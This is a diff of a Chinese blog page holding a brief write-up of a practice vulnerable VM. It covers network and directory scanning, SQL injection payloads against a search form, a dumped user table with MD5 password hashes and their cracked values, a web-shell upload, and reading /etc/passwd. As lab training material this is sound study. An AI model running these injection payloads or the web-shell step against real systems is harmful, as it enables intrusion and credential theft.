@@ -299,36 +299,43 @@
 
       
         <p>就简单写写思路，最近开始实习了，也没多少时间去写这种靶场的笔记了</p>
-<h3 id="获取靶机ip"><a href="#获取靶机ip" class="headerlink" title="获取靶机ip"></a>获取靶机ip</h3><p><code>arp-scan -l</code> 获取靶机的ip 为 192.168.0.198</p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap -sV 192.168.0.198</code></p>
+<h3 id="获取靶机ip">获取靶机ip</h3>
+<p><code>arp-scan -l</code> 获取靶机的ip 为 192.168.0.198</p>
+<h3 id="端口扫描">端口扫描</h3>
+<p><code>nmap -sV 192.168.0.198</code></p>
 <p>开放了22 80端口</p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用dirsearch扫描目录</p>
+<h3 id="目录扫描">目录扫描</h3>
+<p>使用dirsearch扫描目录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">39:05] 200 -    0B  - /config.php                                          </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php                                                         </span><br><span class="line">[17:39:07] 200 -  100B  - /index.php/login/</span><br><span class="line">[17:39:08] 200 -    1KB - /login.php                                                       </span><br><span class="line">[17:39:08] 302 -    0B  - /logout.php  -&gt;  login.php</span><br><span class="line">[17:39:10] 200 -    2KB - /register.php                                                     </span><br><span class="line">[17:39:10] 403 -  302B  - /server-status/                                              </span><br><span class="line">[17:39:10] 403 -  301B  - /server-status</span><br><span class="line">[17:39:11] 301 -  316B  - /uploads  -&gt;  http://192.168.0.198/uploads/                     </span><br><span class="line">[17:39:11] 200 -  940B  - /uploads/                     </span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>
-
 <p>访问下 <code>/uploads</code> 看到里面内容为上传</p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问下80端口，是一个注册登录框</p>
+<h3 id="sql注入">SQL注入</h3>
+<p>访问下80端口，是一个注册登录框</p>
 <p>注册后登录 有一个搜索功能，测试了下发现有sql注入</p>
-<p><code>a&#39; or 1=1 #</code>  这里<code>--+ </code>不可以，<code>-- </code> 可以</p>
+<p><code>a' or 1=1 #</code> 这里<code>--+</code>不可以，<code>--</code>
+可以</p>
 <p>使用order by 没有回显</p>
 <p>直接使用union select 试下有几个字段</p>
-<p><code>a&#39; union select 1,2,3-- a</code> 发现有三个字段</p>
+<p><code>a' union select 1,2,3-- a</code> 发现有三个字段</p>
 <p><code>a%27+union+select+version%28%29%2Cdatabase%28%29%2C@@datadir--+a</code></p>
-<p>分别得到 <code>5.7.25-0ubuntu0.18.10.2  </code> <code> webapphacking</code> <code> /var/lib/mysql/ SG</code></p>
-<p><code>a&#39; union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();-- </code></p>
+<p>分别得到 <code>5.7.25-0ubuntu0.18.10.2</code>
+<code>webapphacking</code> <code>/var/lib/mysql/ SG</code></p>
+<p><code>a' union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();--</code></p>
 <p>得到<code>users</code> 和 <code>books</code>两个表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| Column  | Type                 |</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| user    | varchar(30)          |</span><br><span class="line">| address | varchar(50)          |</span><br><span class="line">| id      | smallint(5) unsigned |</span><br><span class="line">| name    | varchar(30)          |</span><br><span class="line">| pasword | varchar(70)          |</span><br><span class="line">+---------+----------------------+</span><br></pre></td></tr></table></figure>
-
-<p>   dump得到账户密码</p>
+<p>dump得到账户密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">superDatabase: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| id | name         | user       | address        | pasword                                     |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |</span><br><span class="line">| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |</span><br><span class="line">| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |</span><br><span class="line">| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |</span><br><span class="line">| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
-
-<p>但是这条superadmin的密码 sqlmap没有解出来  </p>
-<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a> 可以进行破解 最终得到密码为 <code>Uncrackable</code>(用国内的没解出来)</p>
+<p>但是这条superadmin的密码 sqlmap没有解出来</p>
+<p>https://crackstation.net/ 可以进行破解 最终得到密码为
+<code>Uncrackable</code>(用国内的没解出来)</p>
 <p>使用superadmin进行登录，登陆后发现有一个上传功能</p>
-<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>使用蚁剑直接生成shell.php上传就可以连接，这里没有做防护</p>
+<h3 id="getshell">Getshell</h3>
+<p>使用蚁剑直接生成shell.php上传就可以连接，这里没有做防护</p>
 <p>得到www-data权限</p>
 <p><code>cat /etc/passwd</code></p>
-<p>后面发现主机上有两个用户 分别为<code>hackme</code> 和<code> legacy</code></p>
-<p>在legacy目录下存在一个可执行文件 运行后发现没反应，后续看了下最后是通过这个文件进行提权的，但是在这里却用不了，用不了就算了，这个靶机还是比较简单，就一个sql注入，最近一直在实习，也没什么时间，周末有时间的话就看看文章，复现下漏洞，打打靶场啥的，弟弟太菜了，努力呀！</p>
+<p>后面发现主机上有两个用户 分别为<code>hackme</code>
+和<code>legacy</code></p>
+<p>在legacy目录下存在一个可执行文件
+运行后发现没反应，后续看了下最后是通过这个文件进行提权的，但是在这里却用不了，用不了就算了，这个靶机还是比较简单，就一个sql注入，最近一直在实习，也没什么时间，周末有时间的话就看看文章，复现下漏洞，打打靶场啥的，弟弟太菜了，努力呀！</p>
 
     </div>
 
@@ -458,7 +465,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BAip"><span class="nav-number">1.</span> <span class="nav-text">获取靶机ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getshell"><span class="nav-number">5.</span> <span class="nav-text">Getshell</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E9%9D%B6%E6%9C%BAip"><span class="nav-number">1.</span> <span class="nav-text">获取靶机ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">5.</span> <span class="nav-text">Getshell</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -474,7 +481,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -522,7 +529,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -536,7 +543,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -547,7 +554,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -687,6 +694,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
